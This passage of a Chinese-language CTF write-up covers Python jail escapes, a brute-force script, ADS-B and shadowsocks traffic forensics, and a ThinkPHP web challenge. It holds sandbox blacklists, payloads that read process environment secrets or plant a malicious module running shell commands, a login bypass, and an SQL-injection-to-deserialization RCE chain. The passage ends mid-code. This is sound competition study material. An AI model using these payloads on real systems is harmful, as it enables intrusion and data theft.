class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><code class="hljs Bash">import code, os, subprocess<br>import pty<br>def blacklist_fun_callback(*args):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Player! It&#x27;s already banned!&quot;</span>)<br><br>pty.spawn = blacklist_fun_callback<br>os.system = blacklist_fun_callback<br>os.popen = blacklist_fun_callback<br>subprocess.Popen = blacklist_fun_callback<br>subprocess.call = blacklist_fun_callback<br>code.interacet = blacklist_fun_callback<br>code.compile_command = blacklist_fun_callback<br><br>vars = blacklist_fun_callback<br>attr = blacklist_fun_callback<br><span class="hljs-built_in">dir</span> = blacklist_fun_callback<br>getattr = blacklist_fun_callback<br><span class="hljs-built_in">exec</span> = blacklist_fun_callback<br>__import__ = blacklist_fun_callback<br>compile = blacklist_fun_callback<br>breakpoint = blacklist_fun_callback<br><br>del os, subprocess, code, pty, blacklist_fun_callback<br>input_code = input(<span class="hljs-string">&quot;Can u input your code to escape &gt; &quot;</span>)<br><br>blacklist_words = [<br>    <span class="hljs-string">&quot;subprocess&quot;</span>,<br>    <span class="hljs-string">&quot;os&quot;</span>,<br>    <span class="hljs-string">&quot;code&quot;</span>,<br>    <span class="hljs-string">&quot;interact&quot;</span>,<br>    <span class="hljs-string">&quot;pty&quot;</span>,<br>    <span class="hljs-string">&quot;pdb&quot;</span>,<br>    <span class="hljs-string">&quot;platform&quot;</span>,<br>    <span class="hljs-string">&quot;importlib&quot;</span>,<br>    <span class="hljs-string">&quot;timeit&quot;</span>,<br>    <span class="hljs-string">&quot;imp&quot;</span>,<br>    <span class="hljs-string">&quot;commands&quot;</span>,<br>    <span class="hljs-string">&quot;popen&quot;</span>,<br>    <span class="hljs-string">&quot;load_module&quot;</span>,<br>    <span class="hljs-string">&quot;spawn&quot;</span>,<br>    <span class="hljs-string">&quot;system&quot;</span>,<br>    <span class="hljs-string">&quot;/bin/sh&quot;</span>,<br>    <span class="hljs-string">&quot;/bin/bash&quot;</span>,<br>    <span class="hljs-string">&quot;flag&quot;</span>,<br>    <span class="hljs-string">&quot;eval&quot;</span>,<br>    <span class="hljs-string">&quot;exec&quot;</span>,<br>    <span class="hljs-string">&quot;compile&quot;</span>,<br>    <span class="hljs-string">&quot;input&quot;</span>,<br>    <span class="hljs-string">&quot;vars&quot;</span>,<br>    <span class="hljs-string">&quot;attr&quot;</span>,<br>    <span class="hljs-string">&quot;dir&quot;</span>,<br>    <span class="hljs-string">&quot;getattr&quot;</span><br>    <span class="hljs-string">&quot;__import__&quot;</span>,<br>    <span class="hljs-string">&quot;__builtins__&quot;</span>,<br>    <span class="hljs-string">&quot;__getattribute__&quot;</span>,<br>    <span class="hljs-string">&quot;__class__&quot;</span>,<br>    <span class="hljs-string">&quot;__base__&quot;</span>,<br>    <span class="hljs-string">&quot;__subclasses__&quot;</span>,<br>    <span class="hljs-string">&quot;__getitem__&quot;</span>,<br>    <span class="hljs-string">&quot;__self__&quot;</span>,<br>    <span class="hljs-string">&quot;__globals__&quot;</span>,<br>    <span class="hljs-string">&quot;__init__&quot;</span>,<br>    <span class="hljs-string">&quot;__name__&quot;</span>,<br>    <span class="hljs-string">&quot;__dict__&quot;</span>,<br>    <span class="hljs-string">&quot;._module&quot;</span>,<br>    <span class="hljs-string">&quot;builtins&quot;</span>,<br>    <span class="hljs-string">&quot;breakpoint&quot;</span>,<br>    <span class="hljs-string">&quot;import&quot;</span>,<br>]<br><br>def my_filter(input_code):<br>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> blacklist_words:<br>        <span class="hljs-keyword">if</span> x <span class="hljs-keyword">in</span> input_code:<br>            <span class="hljs-built_in">return</span> False<br>    <span class="hljs-built_in">return</span> True<br><br><span class="hljs-keyword">while</span> <span class="hljs-string">&#x27;&#123;&#x27;</span> <span class="hljs-keyword">in</span> input_code and <span class="hljs-string">&#x27;&#125;&#x27;</span> <span class="hljs-keyword">in</span> input_code and input_code.isascii() and my_filter(input_code) and <span class="hljs-string">&quot;eval&quot;</span> not <span class="hljs-keyword">in</span> input_code and len(input_code) &lt; 65:<br>    input_code = <span class="hljs-built_in">eval</span>(f<span class="hljs-string">&quot;f&#x27;&#123;input_code&#125;&#x27;&quot;</span>)<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Player! Pleas.e obey the filter rules which I set!&quot;</span>)<br></code></pre></td></tr></table></figure><p>两层f，payload前面加个{}</p><p>open没有过滤，环境变量的flag没删除</p><p><code>&#123;print(open("/proc/self/environ").read())&#125;</code></p><figure><img src="/img/2023第七届强网杯/170482122320626.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><h2 id="pyjail-its-myrevenge">Pyjail ! It's myRevenge !!!</h2><p>跟前面差不多，删除了环境变量，删掉了pty库</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><code class="hljs Bash">import code, os, subprocess<br><br>def blacklist_fun_callback(*args):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Player! It&#x27;s already banned!&quot;</span>)<br><br>os.system = blacklist_fun_callback<br>os.popen = blacklist_fun_callback<br>subprocess.Popen = blacklist_fun_callback<br>subprocess.call = blacklist_fun_callback<br>code.interact = blacklist_fun_callback<br>code.compile_command = blacklist_fun_callback<br><br>vars = blacklist_fun_callback<br>attr = blacklist_fun_callback<br><span class="hljs-built_in">dir</span> = blacklist_fun_callback<br>getattr = blacklist_fun_callback<br><span class="hljs-built_in">exec</span> = blacklist_fun_callback<br>__import__ = blacklist_fun_callback<br>compile = blacklist_fun_callback<br>breakpoint = blacklist_fun_callback<br><br>del os, subprocess, code, blacklist_fun_callback<br>input_code = input(<span class="hljs-string">&quot;Can u input your code to escape &gt; &quot;</span>)<br>blacklist_words_var_name_fake_in_local_real_in_remote = [<br>    <span class="hljs-string">&quot;subprocess&quot;</span>,<br>    <span class="hljs-string">&quot;os&quot;</span>,<br>    <span class="hljs-string">&quot;code&quot;</span>,<br>    <span class="hljs-string">&quot;interact&quot;</span>,<br>    <span class="hljs-string">&quot;pty&quot;</span>,<br>    <span class="hljs-string">&quot;pdb&quot;</span>,<br>    <span class="hljs-string">&quot;platform&quot;</span>,<br>    <span class="hljs-string">&quot;importlib&quot;</span>,<br>    <span class="hljs-string">&quot;timeit&quot;</span>,<br>    <span class="hljs-string">&quot;imp&quot;</span>,<br>    <span class="hljs-string">&quot;commands&quot;</span>,<br>    <span class="hljs-string">&quot;popen&quot;</span>,<br>    <span class="hljs-string">&quot;load_module&quot;</span>,<br>    <span class="hljs-string">&quot;spawn&quot;</span>,<br>    <span class="hljs-string">&quot;system&quot;</span>,<br>    <span class="hljs-string">&quot;/bin/sh&quot;</span>,<br>    <span class="hljs-string">&quot;/bin/bash&quot;</span>,<br>    <span class="hljs-string">&quot;flag&quot;</span>,<br>    <span class="hljs-string">&quot;eval&quot;</span>,<br>    <span class="hljs-string">&quot;exec&quot;</span>,<br>    <span class="hljs-string">&quot;compile&quot;</span>,<br>    <span class="hljs-string">&quot;input&quot;</span>,<br>    <span class="hljs-string">&quot;vars&quot;</span>,<br>    <span class="hljs-string">&quot;attr&quot;</span>,<br>    <span class="hljs-string">&quot;dir&quot;</span>,<br>    <span class="hljs-string">&quot;getattr&quot;</span><br>    <span class="hljs-string">&quot;__import__&quot;</span>,<br>    <span class="hljs-string">&quot;__builtins__&quot;</span>,<br>    <span class="hljs-string">&quot;__getattribute__&quot;</span>,<br>    <span class="hljs-string">&quot;__class__&quot;</span>,<br>    <span class="hljs-string">&quot;__base__&quot;</span>,<br>    <span class="hljs-string">&quot;__subclasses__&quot;</span>,<br>    <span class="hljs-string">&quot;__getitem__&quot;</span>,<br>    <span class="hljs-string">&quot;__self__&quot;</span>,<br>    <span class="hljs-string">&quot;__globals__&quot;</span>,<br>    <span class="hljs-string">&quot;__init__&quot;</span>,<br>    <span class="hljs-string">&quot;__name__&quot;</span>,<br>    <span class="hljs-string">&quot;__dict__&quot;</span>,<br>    <span class="hljs-string">&quot;._module&quot;</span>,<br>    <span class="hljs-string">&quot;builtins&quot;</span>,<br>    <span class="hljs-string">&quot;breakpoint&quot;</span>,<br>    <span class="hljs-string">&quot;import&quot;</span>,<br>]<br><br>def my_filter(input_code):<br>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> blacklist_words_var_name_fake_in_local_real_in_remote:<br>        <span class="hljs-keyword">if</span> x <span class="hljs-keyword">in</span> input_code:<br>            <span class="hljs-built_in">print</span>(x)<br>            <span class="hljs-built_in">return</span> False<br>    <span class="hljs-built_in">return</span> True<br><br><span class="hljs-keyword">while</span> <span class="hljs-string">&#x27;&#123;&#x27;</span> <span class="hljs-keyword">in</span> input_code and <span class="hljs-string">&#x27;&#125;&#x27;</span> <span class="hljs-keyword">in</span> input_code and input_code.isascii() and my_filter(<br>        input_code) and <span class="hljs-string">&quot;eval&quot;</span> not <span class="hljs-keyword">in</span> input_code and len(input_code) &lt; 65:<br>    input_code = <span class="hljs-built_in">eval</span>(f<span class="hljs-string">&quot;f&#x27;&#123;input_code&#125;&#x27;&quot;</span>)<br>    <span class="hljs-built_in">print</span>(input_code)<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Player! Please obey the filter rules which I set!&quot;</span>)<br></code></pre></td></tr></table></figure><p>有很多个思路，这里给出几个</p><ol type="1"><li>写读文件的命令到1，执行1写入2，读取2(这种好像不行)</li><li>清除blacklist/覆盖filter函数，然后继续input</li><li>写入code/os/subprocess模块为恶意文件，题目importcode后直接调用读flag</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs Bash">&#123;open(<span class="hljs-string">&quot;1&quot;</span>, <span class="hljs-string">&quot;a&quot;</span>).write(<span class="hljs-string">&quot;im&quot;</span>)&#125;<br>&#123;open(<span class="hljs-string">&quot;1&quot;</span>, <span class="hljs-string">&quot;a+&quot;</span>).write(<span class="hljs-string">&quot;port&quot;</span>)&#125;<br>&#123;open(<span class="hljs-string">&quot;1&quot;</span>, <span class="hljs-string">&quot;a+&quot;</span>).write(<span class="hljs-string">&quot; o&quot;</span>)&#125;<br>&#123;open(<span class="hljs-string">&quot;1&quot;</span>, <span class="hljs-string">&quot;a+&quot;</span>).write(<span class="hljs-string">&quot;s;o&quot;</span>)&#125;<br>&#123;open(<span class="hljs-string">&quot;1&quot;</span>, <span class="hljs-string">&quot;a+&quot;</span>).write(<span class="hljs-string">&quot;s.syste&quot;</span>)&#125;<br>&#123;open(<span class="hljs-string">&quot;1&quot;</span>, <span class="hljs-string">&quot;a+&quot;</span>).write(<span class="hljs-string">&quot;m(&quot;</span>+chr(34)+<span class="hljs-string">&quot;cat f* &gt; 2&quot;</span>+chr(34)+<span class="hljs-string">&quot;)&quot;</span>)&#125;<br>&#123;open(<span class="hljs-string">&quot;co&quot;</span>+<span class="hljs-string">&quot;de.py&quot;</span>,<span class="hljs-string">&quot;w&quot;</span>).write(open(<span class="hljs-string">&quot;1&quot;</span>).<span class="hljs-built_in">read</span>())&#125;<br>&#123;<span class="hljs-built_in">print</span>(open(<span class="hljs-string">&quot;2&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>).<span class="hljs-built_in">read</span>())&#125;<br></code></pre></td></tr></table></figure><figure><img src="/img/2023第七届强网杯/17048212231721.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><h2 id="easyfuzz">easyfuzz</h2><p>不懂给了个附件有什么用，纯脑洞题</p><p>爆破9位</p><p>前两位可以为任意数，返回110000000</p><p>然后后面像glob协议一样逐位爆破数字+大小写字母</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> string<br><span class="hljs-keyword">import</span> itertools<br><br>ip = <span class="hljs-string">&quot;101.200.122.251&quot;</span><br>port = <span class="hljs-number">12177</span><br>context(log_level=<span class="hljs-string">&quot;debug&quot;</span>)<br>io = remote(ip, port)<br><br>charset = string.digits + string.ascii_letters<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">send_payload</span>(<span class="hljs-params">payload</span>):<br>    io.recvuntil(<span class="hljs-string">&quot;Enter a string (should be less than 10 bytes): &quot;</span>)<br>    io.sendline(payload)<br>    <span class="hljs-keyword">return</span> io.recvline()[-<span class="hljs-number">10</span>:-<span class="hljs-number">1</span>]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">brute_force</span>():<br>    password = [<span class="hljs-string">&#x27;0&#x27;</span>] * <span class="hljs-number">9</span><br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">9</span>):<br>        <span class="hljs-keyword">for</span> char <span class="hljs-keyword">in</span> charset:<br>            <span class="hljs-comment"># Try the character in the current position</span><br>            password[i] = char<br>            payload = <span class="hljs-string">&quot;&quot;</span>.join(password)<br><br>            <span class="hljs-comment"># Send the payload and get the response</span><br>            response = send_payload(payload)<br><br>            <span class="hljs-comment"># Check if the guessed character is correct (1 in the response)</span><br>            <span class="hljs-keyword">if</span> response[i] == <span class="hljs-number">49</span>:<br>                <span class="hljs-keyword">break</span><br><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span>.join(password)<br><br>result = brute_force()<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Found password: <span class="hljs-subst">&#123;result&#125;</span>&quot;</span>)<br>io.interactive()<br></code></pre></td></tr></table></figure><h2 id="谍影重重2.0">谍影重重2.0</h2><blockquote><p>小明是某间谍组织的一员，他终日监听着我国某重点军事基地的飞行动态，妄图通过分析参数找到我国飞的最快的飞机。我国费尽千辛万苦抓住了他，并在他的电脑上找到了一段他监听的信息，请分析出这段信息中飞的最快的飞机。</p><p>格式为flag{md5(ICAO CODE of the fastest plane)}</p><p>附件内所涉及的信息均为公开信息，题目描述也均为虚构，切勿当真</p></blockquote><p>ADS-B</p><p><code>tshark -r attach.pcapng -T fields -e "tcp.payload" &gt; payload.txt</code></p><p>https://github.com/junzis/pyModeS</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs Bash">import pyModeS as pms<br><br>with open(<span class="hljs-string">&#x27;payload.txt&#x27;</span>) as f:<br>    res = f.read().<span class="hljs-built_in">split</span>()<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> res:<br>    <span class="hljs-keyword">if</span> len(i) == 46:<br>        pms.tell(i[18:])<br></code></pre></td></tr></table></figure><figure><img src="/img/2023第七届强网杯/17048212231722.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><figure><img src="/img/2023第七届强网杯/17048212231723.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>flag为md5('79a05e')</p><p>更多可以参考https://www.cnblogs.com/lynnzixing/p/17912999.html</p><h2 id="谍影重重3.0">谍影重重3.0</h2><blockquote><p>小明被我国抓获之后对所作所为供认不讳，在对他个人电脑监控的过程中，发现存在通过特殊隧道获取境外组织下发的任务文件，请你协助分析出他所获取到的任务文件名称。</p><p>flag提交格式为flag{md5(文件名)}</p><p>附件内所涉及的信息均为公开信息，题目描述也均为虚构内容，如有雷同，切勿当真！</p></blockquote><p>纸飞机、境外 -&gt; shadowsocks</p><p>参考： https://phuker.github.io/posts/shadowsocks-active-probing.htmlhttps://github.com/shadowsocks/shadowsocks/blob/master/shadowsocks/cryptor.py</p><p>需要爆破密钥</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs Bash">import hashlib<br>from Crypto.Cipher import AES<br><br>def EVP_BytesToKey(password, key_len, iv_len):<br>    <span class="hljs-comment"># equivalent to OpenSSL&#x27;s EVP_BytesToKey() with count 1</span><br>    <span class="hljs-comment"># so that we make the same key and iv as nodejs version</span><br>    <span class="hljs-keyword">if</span> hasattr(password, <span class="hljs-string">&#x27;encode&#x27;</span>):<br>        password = password.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>    <span class="hljs-comment"># cached_key = &#x27;%s-%d-%d&#x27; % (password, key_len, iv_len)</span><br>    <span class="hljs-comment"># r = cached_keys.get(cached_key, None)</span><br>    <span class="hljs-comment"># if r:</span><br>        <span class="hljs-comment"># return r</span><br>    m = []<br>    i = 0<br>    <span class="hljs-keyword">while</span> len(b<span class="hljs-string">&#x27;&#x27;</span>.<span class="hljs-built_in">join</span>(m)) &lt; (key_len + iv_len):<br>        md5 = hashlib.md5()<br>        data = password<br>        <span class="hljs-keyword">if</span> i &gt; 0:<br>            data = m[i - 1] + password<br>        md5.update(data)<br>        m.append(md5.digest())<br>        i += 1<br>    ms = b<span class="hljs-string">&#x27;&#x27;</span>.<span class="hljs-built_in">join</span>(m)<br>    key = ms[:key_len]<br>    iv = ms[key_len:key_len + iv_len]<br>    <span class="hljs-comment"># cached_keys[cached_key] = (key, iv)</span><br>    <span class="hljs-built_in">return</span> key, iv<br><br>def decrypt(cipher,password):<br>    key_len = int(256/8)<br>    iv_len = 16<br>    key, _ = EVP_BytesToKey(password, key_len, iv_len)<br>    cipher = bytes.fromhex(cipher)<br>    iv = cipher[:iv_len]<br>    real_cipher = cipher[iv_len:]<br>    obj = AES.new(key, AES.MODE_CFB, iv, segment_size=128)<br>    plain = obj.decrypt(real_cipher)<br>    <span class="hljs-built_in">return</span> plain<br><br><span class="hljs-comment">#tcp原始hex数据</span><br>req_cipher = <span class="hljs-string">&#x27;&#x27;</span><br>res_cipher = <span class="hljs-string">&#x27;&#x27;</span><br><br>with open(<span class="hljs-string">&#x27;password.txt&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>) as f:<br>    passwords = f.readlines()<br><span class="hljs-keyword">for</span> password <span class="hljs-keyword">in</span> passwords:<br>    password.strip(<span class="hljs-string">&#x27;\n&#x27;</span>)<br>    req_plain = decrypt(req_cipher,password)<br>    res_plain = decrypt(res_cipher,password)<br>    <span class="hljs-keyword">if</span> b<span class="hljs-string">&#x27;HTTP&#x27;</span> <span class="hljs-keyword">in</span> req_plain:<br>        <span class="hljs-built_in">print</span>(f<span class="hljs-string">&quot;password:&#123;password&#125;&quot;</span>,f<span class="hljs-string">&quot;\nreq_plain:&#123;req_plain&#125;&quot;</span>,f<span class="hljs-string">&quot;\nres_plain:&#123;res_plain&#125;&quot;</span>)<br></code></pre></td></tr></table></figure><figure><img src="/img/2023第七届强网杯/17048212231724.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>flag为md5('Why-do-you-want-to-know-what-this-is')</p><h1 id="web">WEB</h1><h2 id="happygame">happygame</h2><p>nc返回一些字节，然后可以输入，返回</p><p><code>HTTP/2 client preface string missing or corrupt. Hex dump for received bytes`` xxx</code></p><p>搜索一下发现是grpc服务</p><figure><img src="/img/2023第七届强网杯/17048212231725.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>grpcui本地启动，ProcessMsg方法有参数serializeData</p><p>java反序列化cc链，目前见过可以的有cc1、6、7</p><h2 id="thinkshop">thinkshop</h2><p>按照题目本地起一个docker</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs Bash">docker load &lt; thinkshop.tar<br>docker run -tid --name thinkshop -p 36000:80 -e FLAG=flag&#123;test_flag&#125; thinkshop<br></code></pre></td></tr></table></figure><p>thinkphp5.0.23，目录结构如下</p><figure><img src="/img/2023第七届强网杯/17048212231726.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>Admin.php有登录功能</p><p>根目录下有shop.sql</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs SQL"><span class="hljs-comment">-- ----------------------------</span><br><span class="hljs-comment">-- Records of admin</span><br><span class="hljs-comment">-- ----------------------------</span><br><span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> `admin` <span class="hljs-keyword">VALUES</span> (<span class="hljs-number">1</span>, <span class="hljs-string">&#x27;admin&#x27;</span>, <span class="hljs-string">&#x27;e10adc3949ba59abbe56e057f20f883e&#x27;</span>);<br></code></pre></td></tr></table></figure><figure><img src="/img/2023第七届强网杯/17048212231737.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>正常应该是admin;123456登录，但是传入的username直接放到了find方法的参数中</p><p>thinkphp5.x在find有参数的情况下，默认会去找数据表中的主键列，所以这里使用1;123456登录后台</p><p>定位到<code>application/index/view/admin/goods_edit.html</code></p><p>将data数据反序列化，可以打tp5的反序列化链rce</p><figure><img src="/img/2023第七届强网杯/17048212231738.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>Admin.php的do_edit方法，将data传入saveGood处理</p><figure><img src="/img/2023第七届强网杯/17048212231739.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>跟进，传到updatedata</p><figure><img src="/img/2023第七届强网杯/170482122317310.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>Update.php，从数据库里读数据，value限制得很死，但是这里注意到key是没有过滤的，可以sql注入</p><figure><img src="/img/2023第七届强网杯/170482122317311.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>理清一下思路，key注入将序列化的数据传入数据库，读取再反序列化造成rce</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Plain">id=3&amp;name=ls&amp;price=5.00&amp;on_sale_time=2023-12-15T12%3A45&amp;image=a&amp;data`%3d%27  &#123;payload&#125;  %27%09where%09`id`%3d1%23a=1&amp;data=aaa<br></code></pre></td></tr></table></figure><p>网上找的tp5.1链子，这里注意加上array（序列化有markdownToArray函数，getGoodsbyId函数检测<code>YTo</code>前缀）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span 